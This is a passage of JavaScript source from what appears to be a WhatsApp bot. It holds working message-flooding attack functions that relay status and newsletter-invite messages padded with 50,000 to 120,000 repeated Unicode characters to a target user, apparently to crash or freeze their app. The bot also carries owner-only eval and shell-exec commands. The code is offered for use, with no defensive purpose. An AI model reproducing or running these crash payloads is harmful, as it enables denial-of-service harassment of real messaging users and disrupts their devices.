            text: "@rage\n\n" + "𑇂𑆵𑆴𑆿".repeat(50000)
          }
        },
        expiryTimestamp: Math.floor(Date.now() / 1000) + 3600
      }
    }
  }
}, {});
await bhule.relayMessage("status@broadcast", tmsg.message, {
  messageId: tmsg.key.id,
  statusJidList: [target],
  additionalNodes: [{
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: { jid: target },
        content: undefined
      }]
    }]
  }]
});
console.log("status sent");
}
async function ui1(bhule, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑" + "ꦾ".repeat(120000),
                                jpegThumbnail: null,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await bhule.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
        
            //============
            default:
                if (budy.startsWith('°')) {
                    if (!isCreator) return;
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2);
                        bang = util.format(sat);
                        if (sat == undefined) {
                            bang = util.format(sul);
                        }
                        return reply(bang);
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
                    } catch (e) {
                        reply(String(e));
                    }
                }

                if (budy.startsWith('•')) {
                    if (!isCreator) return;
                    let kode = budy.trim().split(/ +/)[0];
                    let teks;
                    try {
                        teks = await eval(`(async () => { ${kode == ">>"? "return" : ""} ${q}})()`);
                    } catch (e) {
                        teks = e;
                    } finally {
                        await reply(require('util').format(teks));
                    }
                }

                if (budy.startsWith('π')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(`${err}`);
                        if (stdout) return reply(stdout);
                    });
                }
                break;
        } // ← closes switch
        //====================================\\
    } catch (err) {
        console.log(util.format(err));
    }
}; // ← closes async function

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(`Update ${__filename}`);
    delete require.cache[file];
    require(file);
});